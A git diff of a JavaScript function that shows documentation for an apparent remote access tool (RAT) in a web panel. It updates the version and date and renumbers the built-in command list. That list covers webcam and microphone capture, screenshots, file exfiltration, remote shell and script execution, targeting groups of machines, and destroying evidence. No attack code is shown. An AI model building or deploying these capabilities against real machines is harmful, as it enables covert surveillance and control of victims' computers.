@@ -189,13 +189,12 @@ const lawyer = (l) => {
 
   if (l == 0) {
    document.getElementById("fne").textContent = "Readme.md";
-   document.getElementById("readonly").innerHTML = `
-===================================
+   document.getElementById("readonly").innerHTML = `===================================
        DOCUMENTATION
 ===================================
 
-Version : 4.0.1
-Last Updated : 19 Februvary 2021
+Version : 4.1.0
+Last Updated : 24 March 2022
 
 
     INTRODUCTION
@@ -206,52 +205,57 @@ Last Updated : 19 Februvary 2021
 
  LIST OF BUILT-IN FUNCTIONS
 ----------------------------------------------------
-1) Excape(x) - Execute Batch script and Escape()
-2) Escape() - Destroy Evidence and Escape
-3) Marco() - Returns Polo if Online
-4) Exit() - End Execution
-5) Update(x) - Updates self
-6) Hibernate(x) -  till date
-7) Revive() - End Hibernation  
-8) Rename(x) - Renames RAT
-9) Flash() - Flashes Screen, Visual Indication
-10) Vbs(x) - Runs .VBS Script
-11) Bat(x) - Runs .Bat Script
-12) Shell(x) - Runs Shell Commands
-13) Speak(x) - Text to Speech
-14) Play(x) - Play a Remote (mp3) Audio File (URL)
-15) Mic(x) - Records audio for 'x' ms
-16) Lock(x) - Select Target
-17) Info(x) - Shows Info box
-18) Warn(x) - Shows Warning Box
-19) Error(x) - Shows Error box
-20) Timebox(x,y) - Shows Msg Box fo 'y' ms
-21) Google(x) - Googles selected Text
-22) Web(x) - Navigates to 'x' url
-23) Type(x) - Types custom text
-24) Screenshot(x) - Takes a Screenshot
-25) Camera(x) - Captures a Photo
-26) Details() - Retrieves PC Info
-27) Tree(x) - Retrieves Directory / Folder structures
-28) Send(x) - Sends a File
-29) Health(x) - Reports back a RAT's working conditions.
-30) Log() - Return list of active applications.
-31) Delay(x) - Pause Execution temporarily for 'x' ms
-32) Shutdown(x) - Shutsdown the system after 'x' ms"
-33) Clone() - Initiate Clone Operations
-34) NClone() - Stops Cloning Operations
-35) Prompt(x) - Prompts user for an input.
-36) Disk() - Retrieves Disk Info
-37) Download() - Downloads a file onto target.
-37) ExecuteAt(x) - Executes script at specified time.
+1) All() - Select All Available targets.
+2) Class(x) - Selects a Group of Targets.
+3) Lock(x) - Select Target
+
+4) Marco() - Returns Polo if Online
+5) Details() - Retrieves PC Info
+6) Log() - Return list of active applications.
+7) Disk() - Retrieves Disk Info
+8) Health() - Reports back a RAT's working conditions.
+
+9) Escape() - Destroy Evidence and Escape
+10) Exit() - End Execution temporarily.
+11) Revive() - End Hibernation  
+12) Flash() - Flashes Screen, Visual Indication
+13) NClone() - Stops Cloning Operations
+
+14) Rename(x) - Renames RAT
+15) Camera(x) - Captures a Photo
+16) Mic(x) - Records audio for 'x' ms
+17) Tree(x) - Retrieves Directory / Folder structures
+18) Send(x) - Sends a File
+19) Prompt(x) - Prompts user for an input.
+20)- Clone(x,y) - Initiate Clone Operations
+
+21) Update(x) - Updates self
+22) Hibernate(x) -  till date
+23) Excape(x) - Execute Batch script and Escape()
+24) Vbs(x) - Runs .VBS Script
+25) Bat(x) - Runs .Bat Script
+26) Shell(x) - Runs Shell Commands
+27) Speak(x) - Text to Speech
+28) Play(x) - Play a Remote (mp3) Audio File (URL)
+29) Info(x) - Shows Info box
+30) Warn(x) - Shows Warning Box
+31) Error(x) - Shows Error box
+32) Google(x) - Googles selected Text
+33) Web(x) - Navigates to 'x' url
+34) Type(x) - Types custom text
+35) Screenshot(x) - Takes a Screenshot
+36) Delay(x) - Pause Execution temporarily for 'x' ms
+37) Shutdown(x) - Shutsdown the system after 'x' ms"
+38) Download(x) - Downloads a file onto target.
+39) ExecuteAt(x) - Executes script at specified time.
+40)- Timebox(x,y) - Shows Msg Box fo 'y' ms
 
 Eg: PC.Lock("A01");
 
 `;
   } else {
    document.getElementById("fne").textContent = "License.txt";
-   document.getElementById("readonly").innerHTML = `
-===================================
+   document.getElementById("readonly").innerHTML = `===================================
        LICENSE / TERMS OF USE
 ===================================
 
@@ -266,6 +270,7 @@ Permission is hereby granted, free of charge, to any person obtaining a copy of 
 5. RESPECT PRIVACY, DONT BE A D*CK.
 
 THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, AND IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+
 `;
   }
  }
